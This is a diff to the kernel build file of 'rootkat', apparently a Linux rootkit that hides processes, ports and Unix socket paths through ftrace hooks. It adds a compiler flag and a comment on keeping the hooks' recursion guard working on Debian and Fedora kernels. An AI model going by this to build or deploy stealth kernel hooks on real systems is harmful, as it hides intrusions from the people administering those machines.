@@ -3,6 +3,20 @@ ifndef ROOTKAT_I_UNDERSTAND
 $(error Set ROOTKAT_I_UNDERSTAND=1 to build. See README.md)
 endif
 
+# Disable sibling-call (tail-call) optimization for every object in
+# this module. ftrace IPMODIFY hooks with our recursion guard
+# (within_module(parent_ip, THIS_MODULE) → skip) rely on the call to
+# `orig(...)` showing up as a real CALL instruction so the return
+# address sits on the stack inside our module. With sibling-call opt,
+# `return orig(...)` becomes a JMP — return address stays as the
+# kernel-side caller, parent_ip doesn't land in THIS_MODULE on
+# re-entry, recursion guard fails, infinite loop. Hit on Debian
+# 6.12.85 / Fedora 6.14.0 (cross-distro survey 2026-05-08); Ubuntu
+# 6.8 / 7.0 happen to dodge the optimization. Compiler-enforced
+# defense beats relying on every hook author remembering to insert
+# a barrier after orig.
+ccflags-y += -fno-optimize-sibling-calls
+
 obj-m += rootkat.o
 rootkat-y := main.o kallsyms.o resolver.o ftrace_hook.o \
              hidden_pids.o hidden_ports.o hidden_unix_paths.o \
